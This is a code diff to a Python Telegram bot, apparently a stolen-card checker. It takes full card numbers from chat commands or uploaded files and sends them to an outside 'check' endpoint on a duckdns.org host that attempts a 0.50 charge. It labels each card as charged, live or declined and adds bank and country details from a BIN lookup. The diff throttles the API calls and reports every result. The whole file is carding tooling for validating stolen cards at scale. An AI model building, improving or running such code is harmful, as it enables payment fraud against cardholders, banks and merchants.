@@ -11,13 +11,16 @@ API_URL = "http://gatescheck.duckdns.org:7000/check"
 
 stop_users = {}
 
+# تقليل الضغط على API
+api_semaphore = asyncio.Semaphore(2)
+client = httpx.AsyncClient(timeout=15)
+
 # ------------------- BIN Lookup -------------------
 async def get_bin_info(bin_number):
     url = f"https://lookup.binlist.net/{bin_number}"
     try:
-        async with httpx.AsyncClient(timeout=10) as client:
-            r = await client.get(url)
-            data = r.json()
+        r = await client.get(url)
+        data = r.json()
         brand = data.get("scheme", "N/A")
         card_type = data.get("type", "N/A")
         bank = data.get("bank", {}).get("name", "N/A")
@@ -33,26 +36,34 @@ async def check_card_api(card_full):
         "card": card_full,
         "amount": 0.50
     }
-    try:
-        async with httpx.AsyncClient(timeout=15) as client:
+
+    async with api_semaphore:
+        try:
             r = await client.get(API_URL, params=params)
             result_raw = r.json().get('result', '')
             result = result_raw.lower()
 
-        if "charge" in result or "success" in result:
-            return "approved", "Charge"
-        elif "insufficient" in result:
-            return "live", "Insufficient Funds"
-        else:
-            return "declined", result_raw
-    except:
-        return "declined", "Error"
+            if "charge" in result or "success" in result:
+                return "approved", "Charge"
+            elif "insufficient" in result:
+                return "live", "Insufficient Funds"
+            else:
+                return "declined", result_raw
+        except:
+            return "declined", "Error"
 
 # ------------------- Format Response -------------------
 async def format_response(card_full, status, response, taken):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
-    title = "#Charge ✅" if status == "approved" else "#Live 🟢"
+
+    if status == "approved":
+        title = "#Charge ✅"
+    elif status == "live":
+        title = "#Live 🟢"
+    else:
+        title = "#Declined ❌"
+
     return f"""{title}
 
 💳 Card: {card_full}
@@ -65,7 +76,7 @@ async def format_response(card_full, status, response, taken):
 ⏱ Time: {taken}s
 """
 
-# ------------------- /pp Command -------------------
+# ------------------- /pp -------------------
 async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(process_pp(update, context))
 
@@ -79,13 +90,10 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status, response = await check_card_api(card_full)
     taken = round(time.time() - start_time, 2)
 
-    if status in ["approved", "live"]:
-        text = await format_response(card_full, status, response, taken)
-        await update.message.reply_text(text)
-    else:
-        await update.message.reply_text("Declined ❌")
+    text = await format_response(card_full, status, response, taken)
+    await update.message.reply_text(text)
 
-# ------------------- /stop Command -------------------
+# ------------------- /stop -------------------
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_users[user_id] = True
@@ -93,7 +101,6 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ------------------- File Handler -------------------
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # كل رفع ملف يتحول لـ task مستقل
     asyncio.create_task(process_file(update, context))
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -173,11 +180,11 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text("Done ✅")
 
-# ------------------- /start Command -------------------
+# ------------------- /start -------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Bot Ready ✅")
 
-# ------------------- Run Bot -------------------
+# ------------------- Run -------------------
 def main():
     app = Application.builder().token(TOKEN).build()
 
